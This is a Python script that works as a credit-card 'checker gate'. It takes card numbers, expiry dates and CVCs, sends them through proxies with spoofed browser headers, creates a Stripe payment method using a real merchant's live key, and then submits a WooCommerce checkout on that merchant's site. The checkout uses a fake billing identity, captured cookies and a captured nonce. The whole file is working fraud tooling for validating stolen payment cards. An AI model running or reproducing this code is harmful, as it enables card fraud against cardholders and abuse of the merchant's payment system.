import requests
import re
from user_agent import generate_user_agent
from bs4 import BeautifulSoup
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
from colorama import Fore, Style
from proxy import reqproxy

#$225
def fake_user():
   response = requests.get('https://randomuser.me/api/1.2/?nat=us')
   data = response.text
   name_match = re.search(r'"first":"(.*?)"', data)
   name = name_match.group(1) if name_match else ''
   last_match = re.search(r'"last":"(.*?)"', data)
   last = last_match.group(1) if last_match else ''
   email_match = re.search(r'"email":"(.*?)"', data)
   email = email_match.group(1) if email_match else ''
   street_match = re.search(r'"street":"(.*?)"', data)
   street = street_match.group(1) if street_match else ''
   city_match = re.search(r'"city":"(.*?)"', data)
   city = city_match.group(1) if city_match else ''
   state_match = re.search(r'"state":"(.*?)"', data)
   state = state_match.group(1) if state_match else ''
   phone_match = re.search(r'"phone":"(.*?)"', data)
   phone = phone_match.group(1) if phone_match else ''
   postcode_match = re.search(r'"postcode":(.*?),', data)
   postcode = postcode_match.group(1) if postcode_match else ''
   return name, last, email, street, city, state, phone, postcode

def Tele3(ccx):
    session, ip_address = reqproxy()
    ccx = ccx.strip()
    n, mm, yy, cvc = ccx.split("|")

    if "20" in yy:
        yy = yy.split("20")[1]
   
    name, last, email, street, city, state, phone, postcode = fake_user()
    
    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'fa-IR,fa;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Not A(Brand";v="24", "Chromium";v="110"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': generate_user_agent(),
    }

    data = f'type=card&billing_details[address][city]=Kansas+City&billing_details[address][country]=US&billing_details[address][line1]=7104+NW+Prairie+View+Rd&billing_details[address][postal_code]=64151&billing_details[address][state]=MS&billing_details[name]=Rickey+Fadel&billing_details[email]=thih09089%40bugfoo.com&billing_details[phone]=8165848801&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=b80e14a2-8d25-4481-99f1-7505dc68df503f308b&muid=fcf08ff3-bd74-4e85-87b9-ca34b0679ef2134422&sid=29415343-7bb0-4b1a-8ad8-d6f3c5676a5a55b50a&payment_user_agent=stripe.js%2F680542e9e4%3B+stripe-js-v3%2F680542e9e4%3B+card-element&referrer=https%3A%2F%2Fbodyzone.com&time_on_page=36213&key=pk_live_iBIpeqzKOOx2Y8PFCRBfyMU000Q7xVG4Sn&_stripe_account=acct_1MfY3lCRN7CpPGe8'
    
    response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
    try:
       id = response.json()['id']
       print(Fore.GREEN + "PM: ",id, "Proxy is Live: ", ip_address, "gatet3" + Style.RESET_ALL)
    except:
           return '#'


# Define the URL and headers
    url = 'https://bodyzone.com/?wc-ajax=checkout'

    headers1 = {
       'authority': 'bodyzone.com',
        'accept': 'application/json',
        'accept-language': 'fa-IR,fa;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://bodyzone.com',
        'referer': 'https://bodyzone.com/checkout-2/',
        'sec-ch-ua': '"Not A(Brand";v="24", "Chromium";v="110"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': generate_user_agent(),
    }
    
    data2 = {
    "_wp_http_referer": "/?wc-ajax=update_order_review",
    "billing_address_1": "7104 NW Prairie View Rd",
    "billing_address_2": "",
    "billing_city": "Kansas City",
    "billing_company": "Mobile",
    "billing_country": "US",
    "billing_email": "thih09089@bugfoo.com",
    "billing_first_name": "Rickey",
    "billing_last_name": "Fadel",
    "billing_phone": "8165848801",
    "billing_postcode": "64151",
    "billing_state": "MS",
    "order_comments": "",
    "payment_method": "woocommerce_payments",
    "shipping_address_1": "",
    "shipping_address_2": "",
    "shipping_city": "",
    "shipping_company": "",
    "shipping_country": "US",
    "shipping_first_name": "",
    "shipping_last_name": "",
    "shipping_method[0]": "usps_simple:PRIORITY_MAIL",
    "shipping_postcode": "",
    "shipping_state": "CA",
    "wcpay-fingerprint": "5c8e35f40966c76e958329d7c5e13c98",
    "wcpay-is-platform-payment-method": "",
    "wcpay-payment-method": id,
    "woocommerce-process-checkout-nonce": "5027e6fa0a"
    }
    
    cookies = {
    "__ssid": "be26038fa35050d275306fb5e48a086",
    "__stripe_mid": "fcf08ff3-bd74-4e85-87b9-ca34b0679ef2134422",
    "__stripe_sid": "29415343-7bb0-4b1a-8ad8-d6f3c5676a5a55b50a",
    "_ga": "GA1.1.1921314544.1697077225",
    "_ga_HL99TDWEB1": "GS1.1.1697077225.1.1.1697077296.0.0.0",
    "tk_ai": "jetpack%3AZsG8JRUyKwre1i3QDdVEJt3F",
    "woocommerce_cart_hash": "5f92c6646d9c038336cc18e54799de3c",
    "woocommerce_items_in_cart": "1",
    "wp_woocommerce_session_b571fb3ff3c1aedc50b2d4f727a04f4f": "t_0bc27b46404475fae608966669373a%7C%7C1697250045%7C%7C1697246445%7C%7C929a1b609eefad9ef7c67cc5f6325bda"
    }
   # Make the POST request
    response = session.post(url, headers=headers1, data=data2, cookies=cookies, verify=False)  # Note: Set verify=False to disable SSL verification
    try:
       result2 = response.text
    except:
	    return "succeeded"
    return result2
print("working gatet 3")
